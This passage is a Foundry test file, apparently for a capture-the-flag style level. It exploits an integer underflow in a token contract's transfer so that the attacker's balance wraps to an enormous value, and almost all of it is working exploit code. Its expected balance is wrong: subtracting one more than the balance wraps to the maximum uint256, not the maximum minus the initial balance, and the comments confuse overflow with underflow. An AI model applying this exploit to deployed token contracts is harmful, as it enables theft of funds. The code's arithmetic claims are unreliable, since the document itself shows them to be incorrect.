contract TokenExploitTest is Test {
    Token token;
    address exploiter = address(0xBEEF);

    function setUp() public {
        token = new Token();
        vm.deal(exploiter, 1 ether);
        vm.prank(address(this));
        // Transfer initial supply to exploiter for testing
        token.transfer(exploiter, token.balanceOf(address(this)));
        assertEq(token.balanceOf(exploiter), 1000000);
    }

    function test_exploit_arithmetic() public {
        vm.startPrank(exploiter);

        uint256 initialBalance = token.balanceOf(exploiter);
        assertEq(initialBalance, 1000000);

        // Exploit: cause underflow in unchecked subtraction in transfer
        // Since require(balances[msg.sender] - _value >= 0) is always true (unsigned),
        // calling transfer with _value > balance will underflow silently.
        // To trigger overflow, call transfer with _value = initialBalance + 1

        uint256 overflowValue = initialBalance + 1;

        // This will underflow balances[msg.sender] to type(uint256).max - initialBalance
        token.transfer(address(0xDEAD), overflowValue);

        uint256 exploiterBalance = token.balanceOf(exploiter);
        uint256 receiverBalance = token.balanceOf(address(0xDEAD));

        // exploiter balance should have wrapped around to type(uint256).max - initialBalance
        assertGt(exploiterBalance, initialBalance);
        assertEq(exploiterBalance, type(uint256).max - initialBalance);

        // receiver balance should be overflowValue
        assertEq(receiverBalance, overflowValue);

        vm.stopPrank();
    }
